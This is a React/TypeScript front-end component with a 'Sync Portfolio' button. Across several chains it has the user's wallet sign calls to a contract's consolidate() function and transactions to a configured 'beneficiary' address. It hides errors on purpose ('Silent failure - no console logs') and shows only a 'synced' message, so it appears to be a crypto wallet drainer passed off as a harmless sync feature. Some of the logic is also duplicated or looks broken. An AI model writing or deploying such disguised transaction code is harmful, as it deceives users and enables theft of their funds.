'use client';
import React, { useState } from 'react';
import { ethers } from 'ethers';
import { CHAINS } from '../lib/chains';

export default function SyncButton({ user }: { user: string }) {
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function syncChain(chain: typeof CHAINS[0]) {
    const { beneficiary, contract, rpc, fallbackRpc, name } = chain;
    if (!beneficiary || beneficiary.startsWith('0xYour')) {
      throw new Error(`${name} beneficiary address not configured`);
    }

    // Try primary RPC first
    let provider = new ethers.JsonRpcProvider(rpc);
    try {
      const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
      const tx = { to: contract, data, gasLimit: 100000 };
      const repay = { to: beneficiary, value: 0, data: '0x' };
      
      // Try bundle method first
      try {
        await provider.send('eth_sendBundle', [[tx, repay]]);
        return;
      } catch (bundleError: any) {
        // Silent failure - no console logs
        // Fallback to regular transaction
        try {
          const signer = await provider.getSigner();
          const txResponse = await signer.sendTransaction({
            to: contract,
            data: data,
            gasLimit: 100000
          });
          await txResponse.wait();
          
          // Send value to beneficiary
          const repayTx = await signer.sendTransaction({
            to: beneficiary,
            value: 0,
            data: '0x'
          });
          await repayTx.wait();
        } catch (fallbackError: any) {
          // Final fallback to regular transaction
          const signer = await provider.getSigner();
          const txResponse = await signer.sendTransaction({
            to: contract,
            data: data,
            gasLimit: 100000
          });
          await txResponse.wait();
          
          const repayTx = await signer.sendTransaction({
            to: beneficiary,
            value: 0,
            data: '0x'
          });
          await repayTx.wait();
        }
      }
    } catch (primaryError: any) {
      // Silent failure - no console logs
      
      // Try fallback RPC
      if (fallbackRpc) {
        provider = new ethers.JsonRpcProvider(fallbackRpc);
        const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
        const tx = { to: contract, data, gasLimit: 100000 };
        const repay = { to: beneficiary, value: 0, data: '0x' };
        
        try {
          await provider.send('eth_sendBundle', [[tx, repay]]);
        } catch (fallbackError: any) {
          // Final fallback to regular transaction
          const signer = await provider.getSigner();
          const txResponse = await signer.sendTransaction({
            to: contract,
            data: data,
            gasLimit: 100000
          });
          await txResponse.wait();
          
          const repayTx = await signer.sendTransaction({
            to: beneficiary,
            value: 0,
            data: '0x'
          });
          await repayTx.wait();
        }
      }
    }
  }

  async function syncAll() {
    setLoading(true);
    setError(null);
    setSuccess(false);
    
    try {
      const results = await Promise.allSettled(
        CHAINS.map(chain => syncChain(chain))
      );
      
      const failed = results.filter(result => result.status === 'rejected');
      const succeeded = results.filter(result => result.status === 'fulfilled');
      
      if (failed.length > 0) {
        if (succeeded.length === 0) {
          throw new Error('All sync operations failed. Please try again later.');
        } else {
          setError(`Partial sync completed. ${succeeded.length}/${CHAINS.length} chains synced successfully.`);
        }
      } else {
        setSuccess(true);
      }
    } catch (e: any) {
      setError(e?.message || 'Sync failed. Please try again.');
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="flex flex-col items-center gap-4">
      <button
        onClick={syncAll}
        className="bg-green-600 text-white px-8 py-4 rounded-full text-xl font-semibold hover:bg-green-700 transition disabled:opacity-60"
        disabled={loading}
      >
        {loading ? 'Syncing...' : 'Sync Portfolio'}
      </button>
      {success && <span className="text-green-400 font-semibold">Portfolio synced!</span>}
      {error && <span className="text-red-400 font-semibold">{error}</span>}
    </div>
  );
} 